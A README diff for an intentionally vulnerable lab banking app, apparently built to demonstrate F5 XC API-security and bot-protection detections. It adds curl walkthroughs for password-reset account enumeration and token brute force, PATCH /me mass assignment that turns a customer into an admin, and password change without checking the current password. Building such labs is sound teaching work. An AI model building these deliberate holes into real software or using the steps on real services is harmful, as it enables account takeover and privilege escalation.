@@ -36,6 +36,9 @@ Summary, mapped to F5 XC's attack/feature categories:
 | Instant verified account, no email confirmation/CAPTCHA/signup limit | `services/auth/app/main.py` (`register`) | Bot Protection: Fake Accounts |
 | No rate limit/lockout on login; "no such user" vs "wrong password" | `services/auth/app/main.py` (`login`) | Bot Protection: Credential Stuffing / account enumeration |
 | No rate limit/attempt cap on OTP verification (4-digit keyspace) | `services/auth/app/main.py` (`verify_otp`) | Bot Protection: OTP Bruteforce |
+| Password-reset: "no such email" 404 vs. 200-with-token; no throttle on reset requests; short guessable 6-digit token; no attempt cap on token submission | `services/auth/app/main.py` (`forgot_password`, `reset_password`) | Bot Protection: account enumeration / reset flooding / token bruteforce |
+| Mass assignment → privilege escalation — `PATCH /me` applies any field (incl. `role`, `is_verified`, `email`, `ssn_last4`) with no allowlist; a customer sets `role:"admin"` and unlocks every role-checked BFLA/admin endpoint in the app | `services/auth/app/main.py` (`update_me`) | API Security: Mass Assignment → Privilege Escalation / BFLA enabler |
+| Change password without verifying the current one — `POST /password/change` accepts `current_password` but never checks it (session/token alone) | `services/auth/app/main.py` (`change_password`) | API Security: Broken Authentication / insufficient verification |
 | BOLA — no ownership check, sequential integer ids | `services/accounts/app/main.py` (`get_account`) | API Security: Broken Object Level Authorization |
 | Excessive data exposure — full SSN + DOB returned | `services/accounts/app/main.py` (`get_account`) | API Security: Sensitive Data Exposure |
 | Mass assignment on `balance_cents` + no ownership check | `services/accounts/app/main.py` (`update_account`) | API Security: Mass Assignment + BOLA |
@@ -110,6 +113,67 @@ export TOKEN="<jwt-from-above>"
 Or skip straight to a seeded user (see "Seeded test data" below) — same
 `login` → `login/otp/verify` flow with `alice@nimbusbank.io` /
 `password123`.
+
+**Password reset — the token is handed straight back (LAB-ONLY), and it's
+short + guessable + unthrottled:**
+
+```bash
+# Request a reset for a KNOWN email -> 200 with the token in the body.
+curl -s -X POST http://localhost/api/auth/password/forgot \
+  -H "Content-Type: application/json" \
+  -d '{"email":"alice@nimbusbank.io"}'
+# => {"message":"...","user_id":"<uuid>","reset_token":"<6 digits>"}
+
+# An UNKNOWN email returns a DISTINCT 404 -> account enumeration.
+curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost/api/auth/password/forgot \
+  -H "Content-Type: application/json" -d '{"email":"nobody@nimbusbank.io"}'
+# => 404 (a real bank returns the same response either way)
+
+# Reset with the token -> new password. No attempt cap: the 6-digit token
+# is a 1,000,000-key space with nothing throttling guesses here.
+curl -s -X POST http://localhost/api/auth/password/reset \
+  -H "Content-Type: application/json" \
+  -d '{"token":"<token-from-above>","new_password":"newpassword123"}'
+# => {"message":"Password has been reset. You can now sign in."}
+# alice can now log in with newpassword123 (reset it back the same way if you like).
+```
+
+**Mass assignment → privilege escalation (the marquee new gap): become an
+admin from a plain customer account.** Register a fresh customer, log in to get
+`$TOKEN`, then:
+
+```bash
+# Before: a customer.
+curl -s http://localhost/api/auth/me -H "Authorization: Bearer $TOKEN" | jq .role
+# => "customer"
+
+# PATCH /me has no field allowlist — send role:"admin".
+curl -s -X PATCH http://localhost/api/auth/me \
+  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"role":"admin"}' | jq .role
+# => "admin"
+
+# After: the row is genuinely admin now.
+curl -s http://localhost/api/auth/me -H "Authorization: Bearer $TOKEN" | jq .role
+# => "admin"
+
+# Your NEXT access token will carry role:"admin" (log in again to mint one),
+# which then satisfies any endpoint that actually checks role — e.g. the
+# transfers admin-override reversal:
+curl -s -X POST http://localhost/api/transfers/transfers/admin-override \
+  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"transfer_id":1,"action":"reverse"}' | jq
+```
+
+**Change password without knowing the current one:** any wrong/empty
+`current_password` still succeeds — the endpoint never checks it.
+
+```bash
+curl -s -X POST http://localhost/api/auth/password/change \
+  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"current_password":"totally-wrong","new_password":"changed12345"}'
+# => {"message":"Password changed."}  (current_password was never verified)
+```
 
 **BOLA — read any account by walking sequential ids** (works for any account
 id 1-10 regardless of who you logged in as):
@@ -422,8 +486,11 @@ curl -s -X POST http://localhost/api/auth/login/totp/verify -H "Content-Type: ap
   `transfers`, `kyc`, `support`, `cards`, `admin` — all in use as of Phase 3.
   Each service connects to exactly one database and never touches another's.
 - **auth-service** (FastAPI, async SQLAlchemy + asyncpg) — users, login,
-  OTP, and JWT/JWKS issuance. The only service holding the RS256 private
-  key (2048-bit, generated on first boot, persisted in a docker volume).
+  OTP, JWT/JWKS issuance, and the account-lifecycle flows (password
+  reset via `POST /password/forgot` + `/password/reset`, profile edit via
+  `PATCH /me`, and `POST /password/change`). The only service holding the
+  RS256 private key (2048-bit, generated on first boot, persisted in a docker
+  volume).
 - **accounts-service** / **transfers-service** / **kyc-service** /
   **support-service** / **cards-service** (FastAPI) — validate bearer tokens by
   fetching auth-service's public JWKS over the internal docker network; hold no
@@ -633,6 +700,13 @@ seeding convenience only, not a runtime dependency between the databases.
    renders a live cross-service traffic view off `GET /admin/traffic` (open,
    LAB-ONLY) with `GET /admin/overview` as the authenticated-but-role-unchecked
    (BFLA) staff variant.
-10. **Phase 7:** split across multiple environments for a realistic
+10. ~~**Phase 8:** account-lifecycle flows on auth-service — password reset
+    (LAB-ONLY token echo + enumeration + no-throttle + guessable token),
+    `PATCH /me` mass-assignment privilege escalation, and change-password with
+    no current-password verification, plus the Forgot/Reset/Profile pages in
+    the React UI~~ — done. This is the first schema change delivered via the
+    new Alembic workflow (added the `password_reset_tokens` table with no data
+    loss).
+11. **Phase 7:** split across multiple environments for a realistic
     multi-environment F5 XC deployment (e.g. separate XC namespaces for
     auth vs. accounts/transfers).
